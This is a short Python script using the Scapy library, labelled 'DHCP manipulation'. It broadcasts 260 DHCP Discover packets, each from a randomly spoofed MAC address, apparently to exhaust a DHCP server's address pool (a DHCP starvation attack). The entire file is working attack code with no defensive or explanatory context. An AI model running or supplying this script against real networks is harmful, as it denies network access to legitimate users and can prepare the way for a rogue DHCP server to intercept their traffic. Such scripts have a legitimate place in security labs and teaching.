# In the name of God

from scapy.all import *



#### DHCP manipulation

conf.checkIPaddr = False

for i in range(260):
    mac = str(RandMAC())

    # create DHCP Discover Packet
    dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=mac) \
                    /IP(src='0.0.0.0', dst='255.255.255.255') \
                    /UDP(sport=68, dport=67) \
                    /BOOTP(op=1, chaddr = mac) \
                    /DHCP(options=[('message-type', 'discover'),('end')])
    
    
    
    # [optioanl] show captured packet
    print('================== created DHCP packet==========')
    dhcp_discover.show()
    
    # send Packet in a loop
    sendp(dhcp_discover, loop=0, verbose=1, iface='local1')
#    time.sleep()


